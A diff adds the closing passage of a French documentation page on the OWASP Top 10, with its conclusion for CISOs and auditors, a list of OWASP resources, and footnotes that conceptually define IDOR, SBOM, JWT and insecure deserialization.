+<em>La sécurité applicative est un processus continu. Les revues OWASP doivent être intégrées dans les processus de développement (PR reviews, CI/CD), pas uniquement réalisées lors d'audits ponctuels.</em></p>
+</div>
+<p><br></p>
+<hr />
+<h2 id="conclusion">Conclusion<a class="headerlink" href="#conclusion" title="Permanent link">&para;</a></h2>
+<div class="admonition quote">
+<p class="admonition-title">L'OWASP Top 10 est la grammaire de la sécurité applicative.</p>
+<p>Maîtriser l'OWASP Top 10, c'est maîtriser les fondamentaux de la sécurité des applications web. Ces 10 catégories expliquent la grande majorité des compromissions applicatives réelles — non pas parce que les attaquants sont peu créatifs, mais parce que ces vulnérabilités sont systématiquement présentes dans les applications mal sécurisées et systématiquement exploitées par les outils d'attaque automatisés.</p>
+<p>Pour un RSSI ou un auditeur GRC, l'OWASP Top 10 est le référentiel qui permet de parler le même langage que les équipes de développement et les pentesters, de structurer les exigences de sécurité applicative dans les politiques et contrats, et de démontrer aux auditeurs ISO 27001 ou PCI DSS que les risques applicatifs sont identifiés et traités.</p>
+<blockquote>
+<p>La prochaine étape logique est d'explorer le <strong>Patch Management</strong> — le processus structuré qui permet de traiter systématiquement les vulnérabilités identifiées (CVE et OWASP) avant qu'elles ne soient exploitées.</p>
+</blockquote>
+</div>
+<p><br></p>
+<hr />
+<h2 id="ressources-complementaires">Ressources complémentaires<a class="headerlink" href="#ressources-complementaires" title="Permanent link">&para;</a></h2>
+<ul>
+<li><strong>OWASP Top 10:2021</strong> : owasp.org/Top10</li>
+<li><strong>OWASP Testing Guide</strong> : Guide de test complet des vulnérabilités applicatives</li>
+<li><strong>OWASP ASVS</strong> : Application Security Verification Standard (niveaux de maturité applicative)</li>
+<li><strong>OWASP Cheat Sheet Series</strong> : Fiches de remédiation par vulnérabilité</li>
+<li><strong>NVD / CVE</strong> : nvd.nist.gov (pour les CVE correspondant aux catégories OWASP)</li>
+</ul>
+<div class="footnote">
+<hr />
+<ol>
+<li id="fn:1">
+<p><strong>CVE/CVSS</strong> : voir la fiche dédiée CVE &amp; CVSS dans cette section pour le détail du système d'identification et de scoring des vulnérabilités spécifiques.&#160;<a class="footnote-backref" href="#fnref:1" title="Jump back to footnote 1 in the text">&#8617;</a></p>
+</li>
+<li id="fn:2">
+<p><strong>IDOR</strong> (<em>Insecure Direct Object Reference</em>, ou Référence directe non sécurisée à un objet) est une sous-catégorie de A01 consistant à accéder directement à un objet (enregistrement de base de données, fichier) en modifiant un identifiant dans l'URL ou le corps de la requête, sans que l'application vérifie si l'utilisateur est autorisé à accéder à cet objet spécifique.&#160;<a class="footnote-backref" href="#fnref:2" title="Jump back to footnote 2 in the text">&#8617;</a></p>
+</li>
+<li id="fn:3">
+<p>Un <strong>SBOM</strong> (<em>Software Bill of Materials</em>, ou Nomenclature des composants logiciels) est une liste exhaustive de tous les composants logiciels d'une application — bibliothèques, frameworks, dépendances tierces — avec leurs versions. Il permet d'identifier rapidement si l'application est affectée par une CVE publiée sur l'un de ses composants.&#160;<a class="footnote-backref" href="#fnref:3" title="Jump back to footnote 3 in the text">&#8617;</a></p>
+</li>
+<li id="fn:4">
+<p>Un <strong>JWT</strong> (<em>JSON Web Token</em>) est un standard ouvert (RFC 7519) pour créer des tokens d'accès qui peuvent contenir des claims (affirmations sur l'utilisateur). En sécurité applicative, les JWT mal implémentés peuvent permettre des attaques (algorithme <code>none</code>, secret faible, absence de validation de l'expiration).&#160;<a class="footnote-backref" href="#fnref:4" title="Jump back to footnote 4 in the text">&#8617;</a></p>
+</li>
+<li id="fn:5">
+<p>La <strong>désérialisation</strong> est le processus inverse de la sérialisation : convertir des données formatées (JSON, XML, format binaire propriétaire) en objets applicatifs. La désérialisation non sécurisée permet à un attaquant de créer des objets malveillants qui, une fois désérialisés par l'application, exécutent du code arbitraire.&#160;<a class="footnote-backref" href="#fnref:5" title="Jump back to footnote 5 in the text">&#8617;</a></p>
+</li>
+</ol>
+</div>
+
+
+  <nav class="md-tags" >
+    
+      
+      
+      
+        
+        
+      
+      
+        <span class="md-tag md-tag-icon">OWASP</span>
+      
+    
+      
+      
+      
+        
+        
+      
+      
+        <span class="md-tag md-tag-icon">TOP 10</span>
+      
+    
+      
+      
+      
+        
+        
+      
+      
+        <span class="md-tag md-tag-icon">VULNÉRABILITÉS WEB</span>
+      
+    
+      
+      
+      
+        
+        
+      
+      
+        <span class="md-tag md-tag-icon">SÉCURITÉ APPLICATIVE</span>
+      
+    
+      
+      
+      
+        
+        
+      
+      
+        <span class="md-tag md-tag-icon">INJECTION</span>
+      
+    
+      
+      
+      
+        
+        
+      
+      
+        <span class="md-tag md-tag-icon">XSS</span>
+      
+    
+      
+      
+      
+        
+        
+          
+        
+      
+      
+        <span class="md-tag md-tag-icon md-tag--default">API</span>
+      
+    
+      
+      
+      
+        
+        
+      
+      
+        <span class="md-tag md-tag-icon">GRC</span>
+      
+    
+  </nav>
+
+
+
+
+
+
+
+
+  
+  
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+  <script>var tabs=__md_get("__tabs");if(Array.isArray(tabs))e:for(var set of document.querySelectorAll(".tabbed-set")){var labels=set.querySelector(".tabbed-labels");for(var tab of tabs)for(var label of labels.getElementsByTagName("label"))if(label.innerText.trim()===tab){var input=document.getElementById(label.htmlFor);input.checked=!0;continue e}}</script>
+
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  Retour en haut de la page
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+    
+      
+      <nav class="md-footer__inner md-grid" aria-label="Pied de page" >
+        
+          
+          <a href="../cve-cvss/" class="md-footer__link md-footer__link--prev" aria-label="Précédent: CVE &amp; CVSS">
+            <div class="md-footer__button md-icon">
+              
+              <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-square-arrow-left" viewBox="0 0 24 24"><rect width="18" height="18" x="3" y="3" rx="2"/><path d="m12 8-4 4 4 4M16 12H8"/></svg>
+            </div>
+            <div class="md-footer__title">
+              <span class="md-footer__direction">
+                Précédent
+              </span>
+              <div class="md-ellipsis">
+                CVE & CVSS
+              </div>
+            </div>
+          </a>
+        
+        
+          
+          <a href="../patch-management/" class="md-footer__link md-footer__link--next" aria-label="Suivant: Patch Management">
+            <div class="md-footer__title">
+              <span class="md-footer__direction">
+                Suivant
+              </span>
+              <div class="md-ellipsis">
+                Patch Management
+              </div>
+            </div>
+            <div class="md-footer__button md-icon">
+              
+              <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-square-arrow-right" viewBox="0 0 24 24"><rect width="18" height="18" x="3" y="3" rx="2"/><path d="M8 12h8M12 16l4-4-4-4"/></svg>
+            </div>
+          </a>
+        
+      </nav>
+    
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+    <div class="md-copyright__highlight">
+      Copyright &copy; 2025/26 - Alain GUILLON
+
+    </div>
+  
+  
+    Made with
+    <a href="https://zensical.org/" target="_blank" rel="noopener">
+      Zensical
+    </a>
+  
+</div>
+      
+        
+<div class="md-social">
+  
+    
+    
+    
+    
+      
+      
+    
+    <a href="https://github.com/zyrass/omnydocs" target="_blank" rel="noopener" title="github.com" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 7.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2026 Fonticons, Inc.--><path fill="currentColor" d="M173.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M252.8 8C114.1 8 8 113.3 8 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C436.2 457.8 504 362.9 504 252 504 113.3 391.5 8 252.8 8M105.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"/></svg>
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      
+      <script id="__config" type="application/json">{"annotate":null,"base":"../../../..","features":["announce.dismiss","content.code.annotate","content.code.copy","content.code.select","content.footnote.tooltips","content.tabs.link","content.tooltips","navigation.expand","navigation.footer","navigation.indexes","navigation.instant","navigation.instant.prefetch","navigation.path","navigation.prune","navigation.sections","navigation.tabs","navigation.tabs.sticky","navigation.top","navigation.tracking","search.highlight","toc.follow"],"search":"../../../../assets/javascripts/workers/search.e2d2d235.min.js","tags":{"API":"default","ARCHITECTURE":"default","ERREUR":"default","GO":"go_tag","HTTP":"default","JS":"javascript_tag","LINUX":"default","PHILOSOPHIE":"default","PHP":"php_tag","PROTOCOLES":"default","PYTHON":"python_tag","RESEAU":"default","REST":"default","RUST":"rust_tag","SECURITE":"default","STATUT":"default","SYSTEME":"default","TCP":"default","UDP":"default","UNIX":"default"},"translations":{"clipboard.copied":"Copié dans le presse-papier","clipboard.copy":"Copier dans le presse-papier","search.result.more.one":"1 de plus sur cette page","search.result.more.other":"# de plus sur cette page","search.result.none":"Aucun document trouvé","search.result.one":"1 document trouvé","search.result.other":"# documents trouvés","search.result.placeholder":"Taper pour démarrer la recherche","search.result.term.missing":"Non trouvé","select.version":"Sélectionner la version"},"version":null}</script>
+    
+    
+      <script src="../../../../assets/javascripts/bundle.9f55f5b1.min.js"></script>
+      
+        <script src="../../../../assets/javascripts/extra.js"></script>
+      
+    
+  </body>
+</html>
